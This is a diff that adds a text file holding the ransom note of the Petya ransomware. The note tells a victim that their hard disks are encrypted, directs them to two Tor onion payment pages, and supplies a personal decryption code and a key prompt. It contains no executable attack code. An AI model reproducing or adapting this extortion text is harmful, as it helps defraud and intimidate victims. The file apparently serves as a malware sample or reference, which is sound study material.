@@ -1,0 +1,25 @@
+ You became victim of the PETYA RANSOMWARE!
+
+ The harddisks of your computer have been encrypted with an military grade 
+ encryption algorithm. There is no way to restore your data without a special
+ key. You can purchase this key on the darkness page shown in step 2.
+
+ To purchase your key and restore your data, please follow these three easy 
+ steps:
+
+ 1.  Download the Tor Browser at “https://www.torproject.org/” If you need
+    help, please google for “access onion page”.
+ 2.  Visit one of the following pages with the Tor Browser: 
+
+    http://petya37h5tbhyvki.onion/N19fvE 
+    http://petya5koahtsf7sv.onion/N19fvE
+
+ 3.  Enter your personal decryption code there:
+  
+    cdSPP4-JUZrRr-pMSaxq-GX86kc-v0rFF3-JjB161-8WEakz-bBs218-f7Rm2v-h5fTc-
+    djYAEh-KTBFFH-cxX7Le-4MmuJd-Ool0EQ
+
+
+ If you already purchase your key, please enter it below: 
+
+ Key: 
